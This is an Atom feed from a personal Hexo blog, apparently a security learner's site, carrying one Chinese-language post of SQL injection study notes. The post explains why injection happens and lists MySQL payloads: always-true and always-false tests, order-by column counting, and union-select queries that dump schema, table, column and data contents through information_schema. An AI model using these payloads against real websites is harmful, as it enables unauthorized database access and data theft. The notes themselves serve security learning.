<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>fl4g</title>
  
  
  <link href="//atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-10-29T12:09:45.350Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Fl4g_LL</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL注入--学习笔记</title>
    <link href="http://yoursite.com/2019/10/29/SQL%E6%B3%A8%E5%85%A5-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2019/10/29/SQL注入-学习笔记/</id>
    <published>2019-10-29T10:39:36.000Z</published>
    <updated>2019-10-29T12:09:45.350Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>将SQL语句作为参数传给web应用程序，让服务器执行恶意的SQL命令，而不去执行原先设计好的数据库命令。<br>假设我们在浏览器中输入URL <a href="http://www.abc.com?id=1" target="_blank" rel="noopener">www.abc.com?id=1</a> 时，我们在URL中传递变量id，并且提供值为1，由于它是对数据库进行动态查询的请求（其中?id＝1表示数据库查询变量），所以我们可以该URL中嵌入恶意SQL语句。  </p><p>造成SQL注入漏洞原因有两个 ：</p><ul><li>没有对输入的数据进行过滤（过滤输入）</li><li>没有对发送到数据的数据进行转义（转义输出）  </li></ul><h1 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h1><ul><li><code>&#39;#</code> –&gt; 报错，返回数据库错误<br><img src="data:image/png;base64,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" alt="avatar"></li><li><code>&#39; or 1=1#</code> –&gt; 永真条件，返回所有记录</li><li><code>&#39; and 1=2#</code> –&gt; 永假条件，不返回记录  </li><li><code>&#39; or &#39;1&#39;=&#39;1</code></li><li><code>&#39;and &#39;1&#39;=&#39;2</code><br>（有时候单引号不行可以试试双引号）</li></ul><h1 id="利用-information-schema"><a href="#利用-information-schema" class="headerlink" title="利用 information_schema"></a>利用 information_schema</h1><p>information_schema 是 MySQL 中的一个默认数据库，里面存放了其他所有数据库的信息。</p><h2 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h2><p><code>&#39; order by 1#</code> ， <code>&#39; order by 2#</code> 如果列数不存在的话会报错，可以用二分法查询。</p><h2 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h2><ul><li><code>&#39; union select 1, group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#</code></li><li><code>&#39; union select 1, database()#</code><h2 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h2><code>&#39; union select 1, group_concat(TABLE_NAME) from information_schema.TABLES where table_schema = &#39;你想要获取的表名&#39;#</code> <h2 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h2><code>&#39; union select 1, group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_name = &#39;表名&#39;#</code><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><code>&#39; union select 1, group_concat(你想要获取的列名) from 表名#</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;将SQL语句作为参数传给web应用程序，让服务器执行恶意的SQL命令，而不去执行原先设计好的数据库命令。&lt;br&gt;假设我们在浏览器中输入URL
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
